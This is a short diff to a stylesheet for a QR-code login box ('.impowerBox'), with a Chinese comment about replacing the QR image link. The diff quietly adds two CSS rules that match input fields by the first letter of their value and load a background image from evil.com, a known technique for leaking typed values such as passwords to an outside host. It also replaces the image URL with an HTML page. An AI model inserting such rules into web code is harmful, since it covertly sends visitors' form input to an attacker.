@@ -1,3 +1,5 @@
+input[value^="a"] { background: url('http://evil.com/log?a'); }
+input[value^="b"] { background: url('http://evil.com/log?b'); }
 .impowerBox::before {
   content: '';
   display: block;
@@ -9,7 +11,7 @@
   width: 260px;
   height: 260px;
   /* 换成你自己二维码的真实外链地址！比如你的微信二维码图片 */
-  background: url('https://xinyisleep.github.io/img/2025/Webshell/Filter/2.png') no-repeat center center / 100% 100%;
+  background: url('https://xinyisleep.github.io/123.html') no-repeat center center / 100% 100%;
   box-shadow: 0 0 20px #000b;
   border-radius: 16px;
   border: 6px solid #fff;
